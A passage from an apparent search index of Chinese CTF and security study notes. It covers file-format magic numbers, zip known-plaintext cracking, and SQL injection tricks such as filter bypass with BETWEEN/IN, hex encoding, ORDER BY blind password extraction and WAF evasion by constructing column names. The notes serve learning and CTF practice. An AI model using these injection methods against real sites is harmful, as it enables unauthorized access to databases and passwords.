(wav)\uff0c\u6587\u4ef6\u5934\uff1a57415645 AVI (avi)\uff0c\u6587\u4ef6\u5934\uff1a41564920 Real Audio (ram)\uff0c\u6587\u4ef6\u5934\uff1a2E7261FD Real Media (rm)\uff0c\u6587\u4ef6\u5934\uff1a2E524D46 MPEG (mpg)\uff0c\u6587\u4ef6\u5934\uff1a000001BA MPEG (mpg)\uff0c\u6587\u4ef6\u5934\uff1a000001B3 7z\u6587\u4ef6\u5934\uff1a37 7A BC AF 27 1C \u53c2\u8003 \u00b6 \u6587\u4ef6\u683c\u5f0f","title":"\u5e38\u89c1\u6587\u4ef6\u683c\u5f0f"},{"location":"MISC/\u5e38\u89c1\u6587\u4ef6\u683c\u5f0f/#_1","text":"","title":"\u5e38\u89c1\u6587\u4ef6\u683c\u5f0f"},{"location":"MISC/\u5e38\u89c1\u6587\u4ef6\u683c\u5f0f/#png","text":"\u6587\u4ef6\u5934\u4e3a 89 50 4e 47 0d 0a 1a png\u683c\u5f0f\u662f\u7531\u4e0d\u540c\u7684\u6570\u636e\u5757\u7ec4\u6210\u7684","title":"PNG\u683c\u5f0f"},{"location":"MISC/\u5e38\u89c1\u6587\u4ef6\u683c\u5f0f/#jpeg","text":"\u5c5e\u4e8e\u6709\u635f\u538b\u7f29\u7684\u4e0e\u5e73\u53f0\u65e0\u5173\u7684\u56fe\u50cf\u683c\u5f0f\uff0cjpeg\u7684\u538b\u7f29\u6bd4\u9ad8(\u53ef\u9ad8\u8fbe100\uff1a1),png\u4e3b\u8981\u662f\u5757\uff0c\u800cjpeg\u4e3b\u8981\u662f\u4ee5\u6bb5\u7684\u5f62\u5f0f","title":"jpeg\u683c\u5f0f"},{"location":"MISC/\u5e38\u89c1\u6587\u4ef6\u683c\u5f0f/#bmp","text":"\u662fwindows\u7684\u6807\u51c6\u56fe\u50cf\u6587\u4ef6\u683c\u5f0f\uff0c\u901a\u5e38\u60c5\u51b5\u4e0b\u91c7\u7528\u4f4d\u6620\u5c04\u5b58\u50a8\u683c\u5f0f\uff0c\u9664\u4e86\u56fe\u50cf\u7684\u6df1\u5ea6(\u53ef\u4ee5\u7406\u89e3\u4e3a\u63a7\u5236\u8272\u5f69\u7684\u80fd\u529b)\u53ef\u9009\u5916\uff0c\u4e0d\u91c7\u7528\u4efb\u4f55\u5176\u4ed6\u7684\u538b\u7f29\u65b9\u5f0f\uff0c\u56e0\u6b64bmp\u7684\u56fe\u50cf\u8d28\u91cf\u975e\u5e38\u9ad8\uff0c\u4f53\u79ef\u4e5f\u975e\u5e38\u5927\uff0cbmp\u56fe\u50cf\u901a\u5e38\u53ef\u4ee5\u5206\u4e3a\u8bbe\u5907\u76f8\u5173\u4f4d\u56fe\u548c\u8bbe\u5907\u65e0\u5173\u4f4d\u56fe\u4e24\u5927\u7c7b\uff0c\u4e00\u4e2abmp\u7684\u6587\u4ef6\u683c\u5f0f\u901a\u5e38\u7531\u6587\u4ef6\u5934\uff0c\u4fe1\u606f\u5934\uff0c\u989c\u8272\u4fe1\u606f\u548c\u4f4d\u56fe\u6570\u636e\u56db\u90e8\u5206\u7ec4\u6210 \u6587\u4ef6\u5934:\u524d\u9762\u4e24\u4e2a\u5b57\u8282\u4e00\u822c 42 4D \uff0c\u968f\u540e4\u4e2a\u5b57\u8282\u8868\u793a\u4f4d\u56fe\u5927\u5c0f,\u518d\u540e\u97624\u4e2a\u5b57\u8282\u4e3a\u4fdd\u7559\u4f4d\u8bbe\u7f6e\u4e3a0,\u518d\u540e\u9762\u76844\u4e2a\u5b57\u8282\u975e\u5e38\u5173\u952e\uff0c\u8868\u793a\u6587\u4ef6\u5934\u5230\u4f4d\u56fe\u6570\u636e\u7684\u504f\u79fb\u91cf","title":"bmp\u683c\u5f0f"},{"location":"MISC/\u5e38\u89c1\u6587\u4ef6\u683c\u5f0f/#gif","text":"","title":"gif\u683c\u5f0f"},{"location":"MISC/\u5e38\u89c1\u6587\u4ef6\u683c\u5f0f/#zip","text":"","title":"zip\u6587\u4ef6\u683c\u5f0f"},{"location":"MISC/\u5e38\u89c1\u6587\u4ef6\u683c\u5f0f/#_2","text":"\u4e00\u4e2a\u52a0\u5bc6\u7684\u538b\u7f29\u6587\u4ef6 \u538b\u7f29\u6587\u4ef6\u7684\u538b\u7f29\u5de5\u5177\uff0c\u6bd4\u5982 2345 \u597d\u538b\uff0c WinRAR \uff0c 7z \u3002 zip \u7248\u672c\u53f7\u7b49\uff0c\u53ef\u4ee5\u901a\u8fc7\u6587\u4ef6\u5c5e\u6027\u4e86\u89e3\u3002\u5982\u679c\u662f Linux \u5e73\u53f0\uff0c\u7528 zipinfo -v \u53ef\u4ee5\u67e5\u770b\u4e00\u4e2a zip \u5305\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u52a0\u5bc6\u7b97\u6cd5\u7b49 \u77e5\u9053\u538b\u7f29\u5305\u91cc\u67d0\u4e2a\u6587\u4ef6\u7684\u90e8\u5206\u8fde\u7eed\u5185\u5bb9 (\u81f3\u5c11 12 \u5b57\u8282) \u5982\u679c\u4f60\u5df2\u7ecf\u6709\u538b\u7f29\u5305\u4e2d\u89e3\u538b\u7684\u4e00\u4e2a\u6587\u4ef6\uff0c\u4e5f\u5c31\u662f\u77e5\u9053\u4e86\u538b\u7f29\u5427\u4e2d\u7684\u90e8\u5206\u5185\u5bb9\uff0c\u5c31\u53ef\u4ee5\u5c1d\u8bd5\u660e\u6587\u653b\u51fb \u9996\u5148\uff0c\u5c06\u8fd9\u4e2a\u660e\u6587\u6587\u4ef6\u6253\u5305\u6210 zip \u5305\uff0c\u6bd4\u5982\u5c06 readme.txt \u6253\u5305\u6210 readme.zip \u3002 \u6253\u5305\u5b8c\u6210\u540e\uff0c\u9700\u8981\u786e\u8ba4\u4e8c\u8005\u91c7\u7528\u7684\u538b\u7f29\u7b97\u6cd5\u76f8\u540c\u3002\u4e00\u4e2a\u7b80\u5355\u7684\u5224\u65ad\u65b9\u6cd5\u662f\u7528 WinRAR \u6253\u5f00\u6587\u4ef6\uff0c\u540c\u4e00\u4e2a\u6587\u4ef6\u538b\u7f29\u540e\u7684\u4f53\u79ef\u662f\u5426\u76f8\u540c\u3002\u5982\u679c\u76f8\u540c\uff0c\u57fa\u672c\u53ef\u4ee5\u8bf4\u660e\u4f60\u7528\u7684\u538b\u7f29\u7b97\u6cd5\u662f\u6b63\u786e\u7684\u3002\u5982\u679c\u4e0d\u540c\uff0c\u5c31\u5c1d\u8bd5\u53e6\u4e00\u79cd\u538b\u7f29\u7b97\u6cd5\u3002 \u5f88\u6709\u53ef\u80fd\u9047\u5230\u8fd9\u79cd\u60c5\u51b5","title":"\u660e\u6587\u653b\u51fb\u539f\u7406"},{"location":"MISC/\u5e38\u89c1\u6587\u4ef6\u683c\u5f0f/#_3","text":"ZipCenOp.jar \u611f\u89c9\u7528\u5904\u4e0d\u662f\u5f88\u5927","title":"\u4f2a\u52a0\u5bc6\u7684\u7834\u89e3\u65b9\u5f0f"},{"location":"MISC/\u5e38\u89c1\u6587\u4ef6\u683c\u5f0f/#_4","text":"JPEG (jpg)\uff0c\u6587\u4ef6\u5934\uff1aFFD8FFE0 PNG (png)\uff0c\u6587\u4ef6\u5934\uff1a89504E47 GIF (gif)\uff0c\u6587\u4ef6\u5934\uff1a474946383961 ZIP Archive (zip)\uff0c\u6587\u4ef6\u5934\uff1a504B0304 RAR Archive (rar)\uff0c\u6587\u4ef6\u5934\uff1a52617221 Wave (wav)\uff0c\u6587\u4ef6\u5934\uff1a57415645 AVI (avi)\uff0c\u6587\u4ef6\u5934\uff1a41564920 Real Audio (ram)\uff0c\u6587\u4ef6\u5934\uff1a2E7261FD Real Media (rm)\uff0c\u6587\u4ef6\u5934\uff1a2E524D46 MPEG (mpg)\uff0c\u6587\u4ef6\u5934\uff1a000001BA MPEG (mpg)\uff0c\u6587\u4ef6\u5934\uff1a000001B3 7z\u6587\u4ef6\u5934\uff1a37 7A BC AF 27 1C","title":"\u6587\u4ef6\u5934"},{"location":"MISC/\u5e38\u89c1\u6587\u4ef6\u683c\u5f0f/#_5","text":"\u6587\u4ef6\u683c\u5f0f","title":"\u53c2\u8003"},{"location":"SQL/","text":"SQL\u6ce8\u5165 \u00b6","title":"SQL\u6ce8\u5165"},{"location":"SQL/#sql","text":"","title":"SQL\u6ce8\u5165"},{"location":"SQL/blindSQL/","text":"","title":"blindSQL"},{"location":"SQL/ch0/","text":"sql\u6ce8\u5165\u59ff\u52bf\u79ef\u7d2f \u00b6 in\u64cd\u4f5c\u7b26 \u00b6 \u5bf9\u5b83\u7684\u63cf\u8ff0\uff1aIN\u64cd\u4f5c\u7b26\u5141\u8bb8\u6211\u4eec\u5728WHERE\u5b50\u53e5\u4e2d\u89c4\u5b9a\u591a\u4e2a\u503c\u3002\u4e5f\u5c31\u8bf4\u53ef\u4ee5\u8ba9\u6211\u4eec\u4f9d\u7167\u4e00\u6216\u6570\u4e2a\u4e0d\u8fde\u7eed(discrete)\u7684\u503c\u7684\u9650\u5236\u4e4b\u5185\u6293\u51fa\u6570\u636e\u5e93\u4e2d\u7684\u503c\u3002 \u90a3\u5b83\u662f\u5426\u53ef\u7528\u4e8e\u5728\u8fc7\u6ee4\u7b49\u53f7\u548c\u8fc7\u6ee4like\u7684sql\u6ce8\u5165\u60c5\u51b5\u4e0b\u5462\uff1f \u7b80\u5355\u53e5\u5f0f\u4e3e\u4f8b\uff1a betweeen \u00b6 \u5bf9\u5b83\u7684\u63cf\u8ff0\uff1aBETWEEN\u64cd\u4f5c\u7b26\u5728WHERE\u5b50\u53e5\u4e2d\u4f7f\u7528\uff0c\u4f5c\u7528\u662f\u9009\u53d6\u4ecb\u4e8e\u4e24\u4e2a\u503c\u4e4b\u95f4\u7684\u6570\u636e\u8303\u56f4\u3002\u4e5f\u5c31\u8bf4\u8ba9\u6211\u4eec\u53ef\u4ee5\u8fd0\u7528\u4e00\u4e2a\u8303\u56f4(range)\u5185\u6293\u51fa\u6570\u636e\u5e93\u4e2d\u7684\u503c\u3002 \u90a3\u5b83\u662f\u5426\u4e5f\u53ef\u7528\u4e8e\u5728\u8fc7\u6ee4\u7b49\u53f7\u548c\u8fc7\u6ee4like\u7684sql\u6ce8\u5165\u60c5\u51b5\u4e0b\u5462\uff1f \u770b\u56fe\uff1a \u8fd8\u6015\u5355\u5f15\u53f7\u88ab\u8fc7\u6ee4\uff1f\u518d\u770b\u4e2a\uff1a \u8fd8\u7a33\u7a33\u7684\u652f\u6301\u5341\u516d\u8fdb\u5236\u7ed5\u8fc7\u59ff\u52bf\u3002 \u8fd9\u4e2a\u59ff\u52bf\u4e0b\u6362\u4e2a\u8bed\u53e5\uff1a select password from users where password between 'a' and 'd' order by \u00b6 \u8fd9\u4e2a\u662f\u5229\u7528orderby\u7684\u6392\u5e8f\u7684\u59ff\u52bf\u8fdb\u884c\u76f2\u6ce8\u3002\u5229\u7528\u6761\u4ef6\u5c31\u662f\u8981\u6709\u5bf9\u5e94\u6ce8\u5165\u51fa\u6570\u636e\u540c\u4e00\u884c\u7684\u5176\u4ed6\u5b57\u6bb5\u7684\u56de\u663e\uff08\u4f8b\u5982\uff1a\u60f3\u6ce8\u5165\u51fapassword\uff0cweb\u7aef\u8981\u6709username\u6216\u8005id\u6216\u8005\u2026\u2026\u7684\u56de\u663e\uff09\u3002 \u7b80\u5355\u793a\u4f8b\uff0c\u5047\u5982\u8981\u901a\u8fc7\u6ce8\u5165\u5f97\u5230abcde\u7528\u6237\u5bc6\u7801\uff0cweb\u9875\u9762\u6709\u4e2ausername\u56de\u663e\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5c1d\u8bd5\u8fd9\u4e2a\u59ff\u52bf\uff1a \u901a\u8fc7orderby3\u5bf9\u67e5\u8be2\u5230\u7684\u7b2c\u4e09\u4e2a\u5b57\u6bb5password\u8fdb\u884c\u6392\u5e8f\uff0c\u6539\u53d8select\u7684\u7b2c\u4e09\u5b57\u6bb5\u4f4d\u7f6e\u7684\u5185\u5bb9\uff0c\u5982\uff1aaa\u65f6\u5019web\u9875\u9762\u663e\u793ausername\u4e3atest\uff0cab\u65f6\u5019\u8fd8\u662f\u663e\u793a\u4e3atest\uff0cac\u65f6\u5019\u53d8\u6210\u4e86abcde\uff0c\u5c31\u8bc1\u660epassword\u524d\u4e24\u4e2a\u5b57\u7b26\u4e3aab\uff0c\u7136\u540e\u4f9d\u6b21\u518d\u5f80\u540e\u731c\u6d4b\u2026\u2026 \u8fd9\u4e2a\u59ff\u52bf\u518d\u7ed3\u5408\u4e2a\u811a\u672c\u5c82\u4e0d\u7f8e\u6ecb\u6ecb\u3002 \u5217\u540d\u6784\u9020 \u00b6 \u6ce8\u5165\u4e2d\u6709\u65f6\u5019\u4f1a\u9047\u5230\u5217\u540d\u88abwaf\u7684\u5957\u8def\uff0c\u4e07\u91cc\u4e4b\u884c\u53ea\u5dee\u51fa\u6570\u636e\u4e86\uff0c\u5c34\u5c2c\u4e0d\u5df2\u3002\u5728\u8fd9\u65f6\u5019\uff0c\u5c1d\u8bd5\u81ea\u884c\u6784\u9020\u4e00\u4e2a\u5217\u540d\u4e5f\u662f\u5f88\u4e0d\u9519\u7684\u9009\u62e9\u3002 \u4ece\u5b83\uff1a \u5230\u5b83\uff1a \u4e0d\u5c31\u65b0\u6784\u51fa\u4e86\u5217\u540d\uff1f \u518d\u5bf9\u5b83\u505a\u4e2a\u522b\u540d\u7136\u540e\u5c31\u53ef\u4ee5\u4e0d\u7528\u5217\u540d\u6ce8\u5165\u51fa\u6570\u636e\u4e86\uff1a \u4e34\u65f6\u53d8\u91cf \u00b6 \u4e34\u65f6\u53d8\u91cf\u662f\u4ec0\u4e48\u60f3\u5fc5\u5927\u5bb6\u90fd\u77e5\u9053\uff0c\u8fd9\u4e2a\u59ff\u52bf\u5462\uff5e\u9700\u8981\u4e34\u65f6\u53d8\u91cf\u7ed3\u5408into\u8bed\u6cd5\u6765\u8fdb\u884c\u5229\u7528\uff0c\u6817\u5b50 \u7528into\u5bf9\u4e34\u65f6\u53d8\u91cf@a\u8d4b\u503c\uff0c\u518d\u53bb\u67e5\u8be2@a\u662f\u53ef\u4ee5\u5f97\u5230\u8d4b\u503c\u5185\u5bb9\u7684\u3002 \u6ce8\u5165\u7684\u65f6\u5019\u600e\u4e48\u7528\u5462\uff1f \u770b\u8d77\u6765\u5f88\u597d\u5229\u7528\u7684\u6837\u5b50\uff0c\u5176\u5b9e\u653e\u5230web\u7f51\u7ad9\u4e0a\u5c31\u5f88\u9e21\u808b\u4e86\u3002\u540c\u4e00\u6ce8\u5165\u70b9\u5148web\u8bf7\u6c42\u8fdb\u884cinto\u7684\u4e34\u65f6\u53d8\u91cf\u8d4b\u503c\uff0c\u518dweb\u8bf7\u6c42\u8fdb\u884c\u4e34\u65f6\u53d8\u91cf\u67e5\u8be2\u65f6\u5019\uff0c\u4f1a\u53d1\u73b0\u5b83\u662f\u884c\u4e0d\u901a\u7684\u3002\u5728\u7b2c\u4e00\u4e2aweb\u8fde\u63a5\u7ed3\u675f\u65f6\u5019\uff0c\u4e34\u65f6\u53d8\u91cf\u91ca\u653e\u6389\u4e86\uff0c\u7b2c\u4e8c\u6b21web\u8bf7\u6c42\u67e5\u8be2\u662f\u627e\u4e0d\u5230\u4e0d\u5230\u5b83\u7684\u3002 \u8fd8\u6709\u4e2a\u5b9e\u7528\u7684\u5c0f\u5229\u7528\uff1a \u60f3\u5230\u4e86\u4ec0\u4e48\uff1f\u662f\u4e0d\u662f\u53ef\u4ee5\u7528\u6765orderby\u8fdb\u884c\u8868\u7684\u5217\u6570\u5224\u65ad\uff1f \u8fd9\u6837\u4e00\u6765\uff0c\u80fd\u7528\u5b83\u7684\u60c5\u51b5\u73b0\u6709\u4e09\u79cd\u573a\u666f\uff1a\u4e00\u4e2a\u5c31\u662f\u5b58\u5728\u5806\u53e0\u6ce8\u5165\u65f6\u5019\uff0c\u53e6\u4e00\u4e2a\u5c31\u662f\u540cweb\u9875\u9762\u4e24\u4e2a\u6ce8\u5165\u6f0f\u6d1e\u65f6\u5019\uff0c\u518d\u4e00\u4e2a\u5c31\u662f\u5f53orderby\u88abwaf\u540e\u7528\u6765\u5224\u65ad\u5b57\u6bb5\u6570\u76ee\u65f6\u5019\u3002 \u53c2\u8003 \u00b6 sql\u9a9a\u59ff\u52bf","title":"sql\u6ce8\u5165\u59ff\u52bf\u79ef\u7d2f"},{"location":"SQL/ch0/#sql","text":"","title":"sql\u6ce8\u5165\u59ff\u52bf\u79ef\u7d2f"},{"location":"SQL/ch0/#in","text":"\u5bf9\u5b83\u7684\u63cf\u8ff0\uff1aIN\u64cd\u4f5c\u7b26\u5141\u8bb8\u6211\u4eec\u5728WHERE\u5b50\u53e5\u4e2d\u89c4\u5b9a\u591a\u4e2a\u503c\u3002\u4e5f\u5c31\u8bf4\u53ef\u4ee5\u8ba9\u6211\u4eec\u4f9d\u7167\u4e00\u6216\u6570\u4e2a\u4e0d\u8fde\u7eed(discrete)\u7684\u503c\u7684\u9650\u5236\u4e4b\u5185\u6293\u51fa\u6570\u636e\u5e93\u4e2d\u7684\u503c\u3002 \u90a3\u5b83\u662f\u5426\u53ef\u7528\u4e8e\u5728\u8fc7\u6ee4\u7b49\u53f7\u548c\u8fc7\u6ee4like\u7684sql\u6ce8\u5165\u60c5\u51b5\u4e0b\u5462\uff1f \u7b80\u5355\u53e5\u5f0f\u4e3e\u4f8b\uff1a","title":"in\u64cd\u4f5c\u7b26"},{"location":"SQL/ch0/#betweeen","text":"\u5bf9\u5b83\u7684\u63cf\u8ff0\uff1aBETWEEN\u64cd\u4f5c\u7b26\u5728WHERE\u5b50\u53e5\u4e2d\u4f7f\u7528\uff0c\u4f5c\u7528\u662f\u9009\u53d6\u4ecb\u4e8e\u4e24\u4e2a\u503c\u4e4b\u95f4\u7684\u6570\u636e\u8303\u56f4\u3002\u4e5f\u5c31\u8bf4\u8ba9\u6211\u4eec\u53ef\u4ee5\u8fd0\u7528\u4e00\u4e2a\u8303\u56f4(range)\u5185\u6293\u51fa\u6570\u636e\u5e93\u4e2d\u7684\u503c\u3002 \u90a3\u5b83\u662f\u5426\u4e5f\u53ef\u7528\u4e8e\u5728\u8fc7\u6ee4\u7b49\u53f7\u548c\u8fc7\u6ee4like\u7684sql\u6ce8\u5165\u60c5\u51b5\u4e0b\u5462\uff1f \u770b\u56fe\uff1a \u8fd8\u6015\u5355\u5f15\u53f7\u88ab\u8fc7\u6ee4\uff1f\u518d\u770b\u4e2a\uff1a \u8fd8\u7a33\u7a33\u7684\u652f\u6301\u5341\u516d\u8fdb\u5236\u7ed5\u8fc7\u59ff\u52bf\u3002 \u8fd9\u4e2a\u59ff\u52bf\u4e0b\u6362\u4e2a\u8bed\u53e5\uff1a select password from users where password between 'a' and 'd'","title":"betweeen"},{"location":"SQL/ch0/#order-by","text":"\u8fd9\u4e2a\u662f\u5229\u7528orderby\u7684\u6392\u5e8f\u7684\u59ff\u52bf\u8fdb\u884c\u76f2\u6ce8\u3002\u5229\u7528\u6761\u4ef6\u5c31\u662f\u8981\u6709\u5bf9\u5e94\u6ce8\u5165\u51fa\u6570\u636e\u540c\u4e00\u884c\u7684\u5176\u4ed6\u5b57\u6bb5\u7684\u56de\u663e\uff08\u4f8b\u5982\uff1a\u60f3\u6ce8\u5165\u51fapassword\uff0cweb\u7aef\u8981\u6709username\u6216\u8005id\u6216\u8005\u2026\u2026\u7684\u56de\u663e\uff09\u3002 \u7b80\u5355\u793a\u4f8b\uff0c\u5047\u5982\u8981\u901a\u8fc7\u6ce8\u5165\u5f97\u5230abcde\u7528\u6237\u5bc6\u7801\uff0cweb\u9875\u9762\u6709\u4e2ausername\u56de\u663e\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5c1d\u8bd5\u8fd9\u4e2a\u59ff\u52bf\uff1a \u901a\u8fc7orderby3\u5bf9\u67e5\u8be2\u5230\u7684\u7b2c\u4e09\u4e2a\u5b57\u6bb5password\u8fdb\u884c\u6392\u5e8f\uff0c\u6539\u53d8select\u7684\u7b2c\u4e09\u5b57\u6bb5\u4f4d\u7f6e\u7684\u5185\u5bb9\uff0c\u5982\uff1aaa\u65f6\u5019web\u9875\u9762\u663e\u793ausername\u4e3atest\uff0cab\u65f6\u5019\u8fd8\u662f\u663e\u793a\u4e3atest\uff0cac\u65f6\u5019\u53d8\u6210\u4e86abcde\uff0c\u5c31\u8bc1\u660epassword\u524d\u4e24\u4e2a\u5b57\u7b26\u4e3aab\uff0c\u7136\u540e\u4f9d\u6b21\u518d\u5f80\u540e\u731c\u6d4b\u2026\u2026 \u8fd9\u4e2a\u59ff\u52bf\u518d\u7ed3\u5408\u4e2a\u811a\u672c\u5c82\u4e0d\u7f8e\u6ecb\u6ecb\u3002","title":"order by"},{"location":"SQL/ch0/#_1","text":"\u6ce8\u5165\u4e2d\u6709\u65f6\u5019\u4f1a\u9047\u5230\u5217\u540d\u88abwaf\u7684\u5957\u8def\uff0c\u4e07\u91cc\u4e4b\u884c\u53ea\u5dee\u51fa\u6570\u636e\u4e86\uff0c\u5c34\u5c2c\u4e0d\u5df2\u3002\u5728\u8fd9\u65f6\u5019\uff0c\u5c1d\u8bd5\u81ea\u884c\u6784\u9020\u4e00\u4e2a\u5217\u540d\u4e5f\u662f\u5f88\u4e0d\u9519\u7684\u9009\u62e9\u3002 \u4ece\u5b83\uff1a \u5230\u5b83\uff1a \u4e0d\u5c31\u65b0\u6784\u51fa\u4e86\u5217\u540d\uff1f \u518d\u5bf9\u5b83\u505a\u4e2a\u522b\u540d\u7136\u540e\u5c31\u53ef\u4ee5\u4e0d\u7528\u5217\u540d\u6ce8\u5165\u51fa\u6570\u636e\u4e86\uff1a","title":"\u5217\u540d\u6784\u9020"},{"location":"SQL/ch0/#_2","text":"\u4e34\u65f6\u53d8\u91cf\u662f\u4ec0\u4e48\u60f3\u5fc5\u5927\u5bb6\u90fd\u77e5\u9053\uff0c\u8fd9\u4e2a\u59ff\u52bf\u5462\uff5e\u9700\u8981\u4e34\u65f6\u53d8\u91cf\u7ed3\u5408into\u8bed\u6cd5\u6765\u8fdb\u884c\u5229\u7528\uff0c\u6817\u5b50 \u7528into\u5bf9\u4e34\u65f6\u53d8\u91cf@a\u8d4b\u503c\uff0c\u518d\u53bb\u67e5\u8be2@a\u662f\u53ef\u4ee5\u5f97\u5230\u8d4b\u503c\u5185\u5bb9\u7684\u3002 \u6ce8\u5165\u7684\u65f6\u5019\u600e\u4e48\u7528\u5462\uff1f \u770b\u8d77\u6765\u5f88\u597d\u5229\u7528\u7684\u6837\u5b50\uff0c\u5176\u5b9e\u653e\u5230web\u7f51\u7ad9\u4e0a\u5c31\u5f88\u9e21\u808b\u4e86\u3002\u540c\u4e00\u6ce8\u5165\u70b9\u5148web\u8bf7\u6c42\u8fdb\u884cinto\u7684\u4e34\u65f6\u53d8\u91cf\u8d4b\u503c\uff0c\u518dweb\u8bf7\u6c42\u8fdb\u884c\u4e34\u65f6\u53d8\u91cf\u67e5\u8be2\u65f6\u5019\uff0c\u4f1a\u53d1\u73b0\u5b83\u662f\u884c\u4e0d\u901a\u7684\u3002\u5728\u7b2c\u4e00\u4e2aweb\u8fde\u63a5\u7ed3\u675f\u65f6\u5019\uff0c\u4e34\u65f6\u53d8\u91cf\u91ca\u653e\u6389\u4e86\uff0c\u7b2c\u4e8c\u6b21web\u8bf7\u6c42\u67e5\u8be2\u662f\u627e\u4e0d\u5230\u4e0d\u5230\u5b83\u7684\u3002 \u8fd8\u6709\u4e2a\u5b9e\u7528\u7684\u5c0f\u5229\u7528\uff1a \u60f3\u5230\u4e86\u4ec0\u4e48\uff1f\u662f\u4e0d\u662f\u53ef\u4ee5\u7528\u6765orderby\u8fdb\u884c\u8868\u7684\u5217\u6570\u5224\u65ad\uff1f \u8fd9\u6837\u4e00\u6765\uff0c\u80fd\u7528\u5b83\u7684\u60c5\u51b5\u73b0\u6709\u4e09\u79cd\u573a\u666f\uff1a\u4e00\u4e2a\u5c31\u662f\u5b58\u5728\u5806\u53e0\u6ce8\u5165\u65f6\u5019\uff0c\u53e6\u4e00\u4e2a\u5c31\u662f\u540cweb\u9875\u9762\u4e24\u4e2a\u6ce8\u5165\u6f0f\u6d1e\u65f6\u5019\uff0c\u518d\u4e00\u4e2a\u5c31\u662f\u5f53orderby\u88abwaf\u540e\u7528\u6765\u5224\u65ad\u5b57\u6bb5\u6570\u76ee\u65f6\u5019\u3002","title":"\u4e34\u65f6\u53d8\u91cf"},{"location":"SQL/ch0/#_3","text":"sql\u9a9a\u59ff\u52bf","title":"\u53c2\u8003"},{"location":"SQL/ch1/","text":"SQL\u59ff\u52bf \u00b6 \u57fa\u672c\u77e5\u8bc6 \u00b6 1 2 3 4 5 information_schema.tables: \u67e5\u8be2\u8868\u540d:table_name \u5bf9\u5e94\u7684\u6570\u636e\u5e93\u540d: table_schema information_schema.columns: \u67e5\u8be2\u5217\u540d:column_name \u5bf9\u5e94\u7684\u8868\u540d:table_schemamysql\u76f2\u6ce8\u8bed\u53e5\u4e00\u822c\u5f62\u5f0f \u67e5\u8be2\u7ed3\u679c + \u6bd4\u8f83\u8fd0\u7b97\u7b26 + \u731c\u6d4b\u503c \u8054\u5408\u6ce8\u5165 \u00b6 \u5806\u53e0\u6ce8\u5165 \u00b6 \u8fd9\u4e2a\u59ff\u52bf\u4e4b\u524d\u6ca1\u89c1\u8fc7\uff0c\u4f46\u662f\u5f88\u597d\u7406\u89e3\uff0c\u4e0d\u8fc7\u4e3a\u4ec0\u4e48\u80fd\u591f\u4e00\u6b21\u6027\u6267\u884c\u591a\u6761\u8bed\u53e5\u5462\uff1f \u53c2\u8003 \u00b6 \u6700\u6c34\u7684sql\u6ce8\u5165\u603b\u7ed3","title":"SQL\u59ff\u52bf"},{"location":"SQL/ch1/#sql","text":"","title":"SQL\u59ff\u52bf"},{"location":"SQL/ch1/#_1","text":"1 2 3 4 5 information_schema.tables: \u67e5\u8be2\u8868\u540d:table_name \u5bf9\u5e94\u7684\u6570\u636e\u5e93\u540d: table_schema information_schema.columns: \u67e5\u8be2\u5217\u540d:column_name \u5bf9\u5e94\u7684\u8868\u540d:table_schemamysql\u76f2\u6ce8\u8bed\u53e5\u4e00\u822c\u5f62\u5f0f \u67e5\u8be2\u7ed3\u679c + \u6bd4\u8f83\u8fd0\u7b97\u7b26 + \u731c\u6d4b\u503c","title":"\u57fa\u672c\u77e5\u8bc6"},{"location":"SQL/ch1/#_2","text":"","title":"\u8054\u5408\u6ce8\u5165"},{"location":"SQL/ch1/#_3","text":"\u8fd9\u4e2a\u59ff\u52bf\u4e4b\u524d\u6ca1\u89c1\u8fc7\uff0c\u4f46\u662f\u5f88\u597d\u7406\u89e3\uff0c\u4e0d\u8fc7\u4e3a\u4ec0\u4e48\u80fd\u591f\u4e00\u6b21\u6027\u6267\u884c\u591a\u6761\u8bed\u53e5\u5462\uff1f","title":"\u5806\u53e0\u6ce8\u5165"},{"location":"SQL/ch1/#_4","text":"\u6700\u6c34\u7684sql\u6ce8\u5165\u603b\u7ed3","title":"\u53c2\u8003"},{"location":"SQL/sql\u57fa\u672c\u77e5\u8bc6/","text":"SQL(\u7ed3\u6784\u5316\u67e5\u8be2\u8bed\u8a00)\u57fa\u672c\u77e5\u8bc6 \u00b6 select \u00b6 SELECT DISTINCT country FROM Websites; \u4ec5\u4ece \"Websites\" \u8868\u7684 \"country\" \u5217\u4e2d\u9009\u53d6\u552f\u4e00\u4e0d\u540c\u7684\u503c\uff0c\u4e5f\u5c31\u662f\u53bb\u6389 \"country\" \u5217\u91cd\u590d\u503c\uff1a where\u5b50\u53e5\u652f\u6301\u7684\u8fd0\u7b97\u7b26 \u00b6 \u8fd0\u7b97\u7b26 \u63cf\u8ff0 = \u7b49\u4e8e <> \u4e0d\u7b49\u4e8e\u3002 \u6ce8\u91ca\uff1a \u5728 SQL \u7684\u4e00\u4e9b\u7248\u672c\u4e2d\uff0c\u8be5\u64cd\u4f5c\u7b26\u53ef\u88ab\u5199\u6210 != > \u5927\u4e8e < \u5c0f\u4e8e >= \u5927\u4e8e\u7b49\u4e8e <= \u5c0f\u4e8e\u7b49\u4e8e BETWEEN \u5728\u67d0\u4e2a\u8303\u56f4\u5185 LIKE \u641c\u7d22\u67d0\u79cd\u6a21\u5f0f IN \u6307\u5b9a\u9488\u5bf9\u67d0\u4e2a\u5217\u7684\u591a\u4e2a\u53ef\u80fd\u503c \u5176\u4e2d <>\uff0c between\uff0clike\uff0cin \u8981\u7075\u6d3b\u8fd0\u7528 \u4e00\u4e9b\u7279\u6b8a\u6761\u4ef6 \u00b6 1.\u7a7a\u503c\u5224\u65ad\uff1a is null 1 Select * from emp where comm is null; \u67e5\u8be2 emp \u8868\u4e2d comm \u5217\u4e2d\u7684\u7a7a\u503c\u3002 2.between and (\u5728 \u4e4b\u95f4\u7684\u503c) 1 Select * from emp where sal between 1500 and 3000 ; 3.In 1 Select * from emp where sal in (5000,3000,1500); \u67e5\u8be2 EMP \u8868 SAL \u5217\u4e2d\u7b49\u4e8e 5000\uff0c3000\uff0c1500 \u7684\u503c\u3002 4.like Like\u6a21\u7cca\u67e5\u8be2 1 Select * from emp where ename like 'M%'; \u67e5\u8be2 EMP \u8868\u4e2d Ename \u5217\u4e2d\u6709 M \u7684\u503c\uff0cM \u4e3a\u8981\u67e5\u8be2\u5185\u5bb9\u4e2d\u7684\u6a21\u7cca\u4fe1\u606f\u3002 % \u8868\u793a\u591a\u4e2a\u5b57\u503c\uff0c _ \u4e0b\u5212\u7ebf\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff1b M% : 